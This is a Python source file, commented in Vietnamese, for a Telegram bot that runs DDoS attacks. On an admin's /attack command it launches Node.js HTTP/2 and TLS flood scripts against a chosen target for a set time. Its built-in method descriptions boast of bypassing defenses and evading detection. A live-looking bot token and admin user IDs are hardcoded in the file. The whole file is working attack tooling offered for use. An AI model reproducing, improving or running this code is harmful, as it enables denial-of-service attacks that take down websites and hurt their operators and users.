import asyncio
import subprocess
from urllib.parse import quote
import telegram
from telegram.ext import Application, CommandHandler, ContextTypes

# Thêm Bot Token ở đây
TOKEN = "7952028150:AAF3Jc1BrcZB5M3HXiLqAeNRyaeEuD-Lv_I"

# Danh sách các ID admin
ADMIN_IDS = [6926655784, 124134]

# Danh sách các phương thức hợp lệ
VALID_METHODS = {
    "flood": ["node", "flood.js"],
    "rapid": ["node", "rapid.js"],
    "tls": ["node", "kill.js"],
}

# Lock để kiểm soát tấn công đồng thời
attack_lock = asyncio.Lock()

# Lệnh /method chỉ dành cho Admin
async def method(update: telegram.Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❗ You are not verified to use this command.")
        return
    
    message = (
        "🚀 *Available attack methods: 🚀*\n"
        "• `flood` - Use HTTP/2.0 strong requests with GET/POST to send high requests. Not valid for protected targets.\n"
        "• `rapid` - Use HTTP/2.0 and HTTP/1.1 requests for high-speed request flooding to bypass target defenses and disrupt traffic.\n"
        "• `tls` - Use HTTP/2.0 requests with TLSv1.1 and TLSv1.3 to encrypt and flood requests, making detection and mitigation harder."
    )

    await update.message.reply_text(message, parse_mode="Markdown")

# Lưu trữ rate và thread mặc định
rate = "64"
thread = "5"

# Lệnh /set chỉ dành cho ID 6926655784
async def set_rate_thread(update: telegram.Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != 6926655784:
        await update.message.reply_text("❗ You are not authorized to use this command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("⚠️ Usage: `/set <rate> <thread>`")
        return

    # Cập nhật rate và thread
    new_rate = context.args[0]
    new_thread = context.args[1]

    # Kiểm tra xem rate và thread có phải là số không
    if not new_rate.isdigit() or not new_thread.isdigit():
        await update.message.reply_text("⚠️ Rate and thread must be numbers.")
        return

    global rate, thread
    rate = new_rate
    thread = new_thread

    await update.message.reply_text(f"✅ Rate set to `{rate}` and Thread set to `{thread}`.")

# Lệnh tấn công
async def attack(update: telegram.Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❗ You are not verified to use this command.")
        return

    if len(context.args) < 3:
        await update.message.reply_text("⚠️ Usage: `/attack <method> <target> <time>`")
        return

    method = context.args[0].lower()
    target = context.args[1]

    try:
        time_attack = int(context.args[2])
        if time_attack <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("⚠️ Invalid time. Please enter a positive number.")
        return

    if method not in VALID_METHODS:
        await update.message.reply_text(f"⚠️ Invalid method. Please provide one of these methods: {', '.join(VALID_METHODS.keys())}")
        return

    # Kiểm tra nếu có tấn công đang chạy
    if attack_lock.locked():
        await update.message.reply_text("⛔ An attack is already in progress. Please wait until it finishes before starting a new one.")
        return

    # Đánh dấu tấn công đang chạy bằng Lock
    async with attack_lock:
        # Thông báo tấn công bắt đầu
        message = (
            f"**| Attack Launched!**\n"
            f"• **Method:** `{method}`\n"
            f"• **Target:** `{target}`\n"
            f"• **Duration:** `{time_attack} seconds`\n"
            f"• **Sent by:** `@{update.effective_user.username}`\n"
            f"• **Rate:** `{rate}`\n"
            f"• **Threads:** `{thread}`\n"
            f"• **API access:** `True`\n"
            f"• **VIP:** `True`\n"
        )

        # Nút "Open check host"
        reply_markup = {
            "inline_keyboard": [
                [
                    {
                        "text": "🔗 Check-host.net",
                        "url": f"https://check-host.net/check-http?host={quote(target)}"  # Đảm bảo sử dụng quote
                    },
                ],
            ]
        }

        await update.message.reply_text(message, parse_mode="Markdown", reply_markup=reply_markup)


        # Chạy lệnh Node.js tương ứng với các giá trị rate và thread đã cài đặt
        command = VALID_METHODS[method] + [target, str(time_attack), rate, thread, "fast.txt" if method != "rapid" else "fresh.txt"]
        process = await asyncio.create_subprocess_exec(*command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        try:
            # Chờ lệnh hoàn tất
            stdout, stderr = await process.communicate()

            # Ghi log terminal
            if stdout:
                print(stdout.decode())
            if stderr:
                print(stderr.decode())

        except Exception as e:
            print(f"Error while executing attack: {e}")

        finally:
            # Khi tấn công hoàn tất, gửi thông báo
            await update.message.reply_text("✅ Attack completed. You can launch a new one now.")


def main():
    # Khởi tạo bot với Application
    application = Application.builder().token(TOKEN).build()

    # Thêm lệnh /attack và /method vào bot
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("methods", method))
    application.add_handler(CommandHandler("set", set_rate_thread))

    # Bắt đầu bot
    application.run_polling()

if __name__ == "__main__":
    main()
